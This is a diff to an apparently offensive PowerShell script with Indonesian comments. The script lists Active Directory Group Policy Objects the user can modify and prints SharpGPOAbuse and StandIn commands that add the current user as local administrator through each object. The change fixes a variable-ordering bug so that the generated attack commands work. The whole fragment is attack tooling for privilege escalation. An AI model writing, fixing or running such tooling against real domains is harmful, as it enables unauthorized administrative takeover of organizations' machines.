@@ -141,13 +141,12 @@ if ($foundExploit) {
     Add-Content $outfile "Choose attack method for the discovered GPOs:"
     
     # Select-Object -Unique memastikan GPO yang sama tidak diprint berulang kali
+    $me = (whoami).Split('\')[-1]
     foreach ($targetGPO in ($exploitableGPONames | Select-Object -Unique)) {
         Add-Content $outfile "`n>>> Target GPO: $targetGPO"
-        
         Add-Content $outfile "    Option A - SharpGPOAbuse"
         # Menggunakan singel quote agar nama GPO dengan spasi tidak error
         Add-Content $outfile "    ./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount $me --GPOName '$targetGPO'"
-        $me = (whoami).Split('\')[-1]
         Add-Content $outfile "    Option B - StandIn"
         Add-Content $outfile "    ./StandIn.exe --gpo --filter '$targetGPO' --localadmin $me"
     }
